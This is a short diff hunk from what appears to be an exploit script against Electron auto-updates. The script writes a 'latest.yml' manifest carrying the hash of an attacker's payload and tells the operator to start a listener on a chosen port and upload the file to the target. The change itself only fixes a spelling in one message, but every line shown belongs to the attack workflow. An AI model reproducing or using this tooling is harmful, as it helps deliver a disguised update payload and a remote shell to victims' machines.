@@ -14,7 +14,7 @@ sha512: $(sha512sum "${PAYLOAD}" | cut -d' ' -f1 | xxd -p -r | base64 -w0)
 releaseDate: '$(date --utc +%FT%T.%3NZ)'
 EOF
 
-echo "Run your lisner on the port $LPORT you specified"
+echo "Run your listner on the port $LPORT you specified"
 sleep 2
 echo "Upload latest.yml to the target and wait"
 sleep 3
